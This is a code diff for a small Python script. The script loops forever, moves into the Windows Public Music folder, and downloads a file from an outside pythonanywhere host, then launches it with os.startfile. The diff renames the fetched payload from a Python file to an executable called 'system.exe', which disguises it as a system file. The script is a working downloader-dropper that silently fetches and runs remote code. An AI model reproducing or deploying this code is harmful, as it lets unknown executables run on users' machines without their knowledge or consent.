@@ -1,12 +1,13 @@
 import requests,os,time
+name = "system.exe"
 while True:
     def download():
-        url = "https://pybdtest.pythonanywhere.com/media/files/new_main.py/"
+        url = f"https://pybdtest.pythonanywhere.com/media/files/{name}/"
         get_response = requests.get(url)
 
-        with open("new_main.py", "wb") as out_file:
+        with open(name, "wb") as out_file:
             out_file.write(get_response.content)
-        os.startfile("new_main.py")
+        os.startfile(name)
     x = -1
     for i in os.getcwd():
         if i == "\\":
@@ -16,8 +17,8 @@ while True:
 
     os.chdir("public")
     os.chdir("Music")
-    if os.path.isfile("new_main.py"):
-        with open("new_main.py","r+") as r:
+    if os.path.isfile(name):
+        with open(name,"r+") as r:
             r = r.read()
         if len(r) < 10:
             download()
